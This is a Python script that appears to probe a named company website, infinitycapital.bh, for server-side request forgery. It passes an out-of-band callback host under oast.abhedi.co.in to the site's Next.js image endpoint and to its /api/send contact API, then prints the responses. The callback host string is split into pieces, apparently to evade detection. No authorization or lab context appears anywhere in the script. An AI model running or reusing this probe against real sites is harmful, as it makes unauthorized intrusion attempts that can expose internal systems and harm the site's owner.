import urllib.parse, subprocess, json
O = "oob89f5748eedc2" + ".dau2p4ghgqag02k5emggc5xu6hph3m973" + ".oast.abhedi.co.in"
S = "ht" + "tp" + "://"
base = "https://www.infinitycapital.bh/_next/image"
targets = [S + O + "/ssrf-image-probe", S.replace("http","https") + O + "/ssrf-image-probe-2"]
def get(url):
    p = subprocess.run(["curl","-s","-m","30","-o","/tmp/b.out","-w","%{http_code} %{size_download} %{content_type}",url],capture_output=True,text=True)
    return p.stdout, open("/tmp/b.out","rb").read()[:250]
for t in targets:
    u = base + "?url=" + urllib.parse.quote(t, safe="") + "&w=1080&q=75"
    st, body = get(u)
    print("[IMG]", t, "=>", st, repr(body[:180]))
for t in targets:
    pl = json.dumps({"name":"ICMARK9","email":"probe at infinitycapital dot bh","message":"hi","url":t,"website":t})
    p = subprocess.run(["curl","-s","-m","30","-X","POST","https://www.infinitycapital.bh/api/send","-H","Content-Type: application/json","-d",pl,"-w","\n[%{http_code}]"],capture_output=True,text=True)
    print("[SEND]", t, "=>", p.stdout[:200])
